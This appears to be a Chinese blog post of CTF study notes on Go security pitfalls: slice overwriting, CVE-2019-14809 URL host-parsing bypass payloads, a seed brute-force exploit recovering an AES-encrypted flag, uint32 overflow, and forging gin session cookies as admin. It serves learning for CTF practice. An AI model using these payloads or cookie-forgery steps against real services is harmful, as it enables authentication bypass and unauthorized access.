---
title: "Go学习笔记Ⅰ"
slug: "go-study-notes-01"
description: "ctf中常见的Go安全问题，持续更新"
date: 2022-02-26T15:58:41+08:00
categories: ["NOTES&SUMMARY", "LTS"]
series: ["Go学习笔记"]
tags: ["Go"]
draft: false
toc: true
---

## array&slice 变量覆盖

> A slice is a descriptor of an array segment. It consists of a pointer to the array, the length of the segment, and its capacity (the maximum length of the segment).

[Go Slices: usage and internals](https://go.dev/blog/slices-intro)（建议直接看官方文档，我这里简单写一下

go中定义数组的基本操作是这样的

```go
var a[4]int	// int型 4个元素
a[0] = 1	// 下标为1的元素值为1
i := a[0]	// i == 1
```

基本类似于c的写法，数组变量代表整个数组，但是它并不是一个指向第一个数组元素的指针，所以说我们在操作数组中的值时实际上是在用它值的copy

对于slice，既可以直接声明

```go
letters := []string{"a", "b", "c", "d"}
```

也可以用内置的`make`函数

```go
// func make([]T, len, cap) []T
var s []byte
s = make([]byte, 5, 5)
// s == []byte{0, 0, 0, 0, 0}
```

其中，`[]T`表示type，`len`表示长度，而第三个参数`cap`是可以缺省的，默认等于length

```go
s := make([]byte, 5)
```

关于slice的细节是我们关注的重点；它包含了一个指向数组的指针ptr，段的长度len，还有段的最大长度cap ————其实说到这里，如果有经验的已经能知道问题所在了

![img](https://go.dev/blog/slices-intro/slice-struct.png)

以上面的`s`为例（缺省cap），结构是这样的

![img](https://go.dev/blog/slices-intro/slice-1.png)



当我们对`s`进行切片操作`s = s[2:4]`

![img](https://go.dev/blog/slices-intro/slice-2.png)

切片创建了一个新的slice（len和cap均不同），ptr仍指向原数组

所以修改新的slice的元素会修改原始slice的值

```go
d := []byte{'r', 'o', 'a', 'd'}
e := d[2:]
// e == []byte{'a', 'd'}
e[1] = 'm'
// e == []byte{'a', 'm'}
// d == []byte{'r', 'o', 'a', 'm'}
```

元素的个数总是不能超过cap代表的上限，为了动态分配数组大小，我们有时会选择这样的操作

```go
t := make([]byte, len(s), (cap(s)+1)*2) // +1 in case cap(s) == 0
for i := range s {
        t[i] = s[i]
}
s = t
```

创建一个新的slice 并把原来的值复制进来，有一个内置函数可以直接做

```go
func copy(dst, src []T) int
```

copy允许传入length不同的两个slice，它会帮我们处理好可能存在的潜在问题，直接

```go
t := make([]byte, len(s), (cap(s)+1)*2)
copy(t, s)
s = t
```

即可

单纯向slice中添加元素可以使用内置函数`append`

```go
func append(s []T, x ...T) []T
```

当大于cap时它会自动调整，如果要append一个slice也是可以的

```go
a := []string{"John", "Paul"}
b := []string{"George", "Ringo", "Pete"}
a = append(a, b...) // equivalent to "append(a, b[0], b[1], b[2])"
// a == []string{"John", "Paul", "George", "Ringo", "Pete"}
```

这分析了半天，终于到重点了）

上面提到了，re-slicing a slice doesn't make a copy of the underlying array, the full array will by kept in memory until it is no longer referenced

举个例子

```go
package main

import (
	"fmt"
)

func main() {
	var a []int
	a = append(a,1)
	a = append(a,1)
	a = append(a,1)
	b := append(a,2)
	c := append(a,3)
	fmt.Println(b,c)
}
```

```
[1 1 1 3] [1 1 1 3]
```

我们发现3之前的2被覆盖了

假设当a数组在append一个元素时，ptr指向0x1(假设0x1为数组地址), len=1, cap=2；append第二个元素时ptr不变，len=2, cap=2；append第三个元素时容量不够了就会动态扩容，cap=4, len=3，所以ptr指向新的0x2

此时ptr=0x2, len=3, cap=4，再append第四个元素也就是2的时候还不需要扩容，返回ptr=0x2, len=4, cap=4给b，但此时对于a而言len=3，相当于是添加元素然后另存为了，对原数组不影响，c也是一样的情况

————不知道我有没有解释清楚QwQ

### [Teaser CONFidence CTF 2019]The Lottery

参考：[wp](https://github.com/mwarzynski/confidence2019_teaser_lottery)  |  [wp ](https://blog.luckycat.moe/post/teaser-confidence-ctf-2019-the-lottery-writeup/) |  [wp2](https://ce-automne.github.io/2019/03/27/CONFidence%20-CTF-2019-The%20Lottery%20-WriteUp/)

### [RoarCTF 2019]Dist

是上面那个题的改编

参考：[wp1](https://blog.szfszf.top/tech/roarctf2019-web-writeup/)

## CVE-2019-14809 解析host

```
javascript://%250aalert(1)+'aa@google.com/a'a
http://[google.com]:80
http://google.com]:80
http://google.com]:80__Anything_you'd_like_sir
http://[google.com]FreeTextZoneHere]:80
```

由于net/url库的问题，这些URI解析出来Host都是google.com

### 某不知名题

```go
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
)
func SanCheck(input string) error {
	u, err := url.Parse(input)

	if err != nil {
		return err
	}

	if u.Scheme != "http" {
		return fmt.Errorf("err: Invalid Scheme [%s]", u.Scheme)
	}

	if u.Opaque != "" {
		return fmt.Errorf("err: WHAT AER YOU DOING ?!!! (%s)", u.Opaque)
	}

	if u.Hostname() != "127.0.0.1" {
		return fmt.Errorf("err: Invalid Hostname [%s]", u.Hostname())
	}

	if u.Port() != "" && u.Port() != "80" {
		return fmt.Errorf("err: Invalid Port [%s]", u.Port())
	}

	if u.User == nil {
		return fmt.Errorf("err: Authorization Required")
	}

	if u.User.Username() != "root" {
		return fmt.Errorf("err: Invalid Username [%s]", u.User.Username())
	}

	if password, set := u.User.Password(); !set || password != "P@ssw0rd!" {
		return fmt.Errorf("err: Invalid Password [%s]", password)
	}

	if u.RequestURI() != "/flag.php" {
		return fmt.Errorf("err: Invalid RequestURI [%s]", u.RequestURI())
	}

	if u.Fragment != "" {
		return fmt.Errorf("err: Invalid Fragment [%s]", u.Fragment)
	}

	if !strings.Contains(u.String(), "'Pwned!'") {
		fmt.Println(u.String())
		return fmt.Errorf("err: San Check failed" + u.String())
	}

	return nil
}

```

payload

```
http://root:P@ssw0rd!@[127.0.0.1]['Pwned!']:80/flag.php
```

## rand.Seed 种子小的情况下可爆破

### [RACTF 2021]Military Grade

```go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

const rawFlag = "[REDACTED]"

var flag string
var flagmu sync.Mutex

func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte {
	padding := (blockSize - len(ciphertext)%blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string {
	bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext))
	block, err := aes.NewCipher(bKey)
	if err != nil {
		log.Println(err)
		return ""
	}
	ciphertext := make([]byte, len(bPlaintext))
	mode := cipher.NewCBCEncrypter(block, bIV)
	mode.CryptBlocks(ciphertext, bPlaintext)
	return hex.EncodeToString(ciphertext)
}

func changer() {
	ticker := time.NewTicker(time.Millisecond * 672).C
	for range ticker {
		rand.Seed(time.Now().UnixNano() & ^0x7FFFFFFFFEFFF000)
		for i := 0; i < rand.Intn(32); i++ {
			rand.Seed(rand.Int63())
		}

		var key []byte
		var iv []byte

		for i := 0; i < 32; i++ {
			key = append(key, byte(rand.Intn(255)))
		}

		for i := 0; i < aes.BlockSize; i++ {
			iv = append(iv, byte(rand.Intn(255)))
		}

		flagmu.Lock()
		flag = encrypt(rawFlag, key, iv, aes.BlockSize)
		flagmu.Unlock()
	}
}

func handler(w http.ResponseWriter, req *http.Request) {
	flagmu.Lock()
	fmt.Fprint(w, flag)
	flagmu.Unlock()
}

func main() {
	log.Println("Challenge starting up")
	http.HandleFunc("/", handler)

	go changer()

	log.Fatal(http.ListenAndServe(":80", nil))
}
```

flag 被 AES CBC 加密，加密本身没问题，问题出在种子上

种子生成是靠 `rand.Seed(time.Now().UnixNano() & ^0x7FFFFFFFFEFFF000)` 完成，这样得到的种子很小 可以被我们爆破出来

exp.go

```go
package main

import(
	"math/rand"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"strings"
)

func main() {
	hextext := "35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914" // Encrypted Flag
	for seed:=1; seed<=19777868; seed++ {
		rand.Seed(int64(seed))
		for i := 0; i < rand.Intn(32); i++ {
			rand.Seed(rand.Int63())
		}

		var key []byte
		var iv []byte

		for i := 0; i < 32; i++ {
			key = append(key, byte(rand.Intn(255)))
		}

		for i := 0; i < aes.BlockSize; i++ {
			iv = append(iv, byte(rand.Intn(255)))
		}
		block, _ := aes.NewCipher(key)
		mode := cipher.NewCBCDecrypter(block, iv)
		ciphertext, _ := hex.DecodeString(hextext)

		flagBytes := make([]byte, len(ciphertext))
		mode.CryptBlocks(flagBytes, ciphertext)

		flag := string(flagBytes)
		if strings.Contains(flag, "ractf") {
			fmt.Printf("Flag: %s\n", flag)
			break
		}
	}
}
```

`ractf{int3rEst1ng_M4sk_paTt3rn}`

## math/rand未调用Seed默认种子为1

### [WMCTF2020]GOGOGO

参考：[wp](https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/)

## uint32整数溢出

uint32的范围是0~4294967295

### [羊城杯2021]Checkin_Go

```
u1, err1 := strconv.ParseUint(nowMoney,10,32)
u2, err2 := strconv.ParseUint(addMoney,10,32)
....
newMoney = uint32(u1) + uint32(u2)
```

flag price是uint32，以admin身份（伪造cookie）加到溢出，变小，就可以买了

参考：[wp](https://yyz9.cn/2021/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AF2021-checkin_go%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/)

## gin框架伪造cookie

### secure-cookie-faker

工具：[secure-cookie-faker](https://github.com/EddieIvan01/secure-cookie-faker)

decode:

```
.\secure-cookie-faker.exe dec -c ""
```

有type detail的就是object string

encode:

```
.\secure-cookie-faker.exe enc -n "mysession" -k "secret" -o "{user: admin, id: 0[int]}"
```

- `-o `: object string，its like a K-V map, it should have type hints
- `-n` : cookie name, its required because the HMAC hash's generation relies on it
- `-k` : secret key(s), could be multiple: `-k "key1, key2"`, the first is hash key, and the second is encrypt block key

when element's type is `string`, the type tag can be omitted

type tag can only be `int`, `uint`, `float`, `bool`, `string`, `byte`

change serializer

```
.\secure-cookie-faker.exe enc -n "mysession" -k "secret" -o "some-string" -way json
.\secure-cookie-faker.exe enc -n "mysession" -k "secret" -o "{id: 0[int]}" -way json
.\secure-cookie-faker.exe enc -n "mysession" -k "secret" -o "some-string" -way nop
.\secure-cookie-faker.exe dec -c "MTU2NjkxMjI4NXxleUoxYzJWeUlqb2lZV1J0YVc0aWZRbz18OibftwH33BZStXtep7TbN_mbyk8RftQe9t_wxCJXhHo=" -way json
```

### 脚本

```go
package main

import (
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"math/rand"
)

func main() {
	r := gin.Default()
	storage := cookie.NewStore(randomChar(16))
	r.Use(sessions.Sessions("o", storage))
	r.GET("/", cookieHandler)
	r.Run("0.0.0.0:8002")
}

func cookieHandler(c *gin.Context) {
	session := sessions.Default(c)
	session.Set("uname", "admin")	// 修改处
	session.Save()
}

func randomChar(l int) []byte {
	output := make([]byte, l)
	rand.Read(output)
	return output
}	// 伪随机

```

### [VNCTF 2022]gocalc0

据说是y老师出题有误，导致异常简单

![image-20220213002805727](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220213002805727.png)

emmmm

## go<=1.11 net/heep存在CRLF漏洞

https://github.com/go/go/issues/30794

### [WMCTF2020]GOGOGO

参考：[wp](https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/)

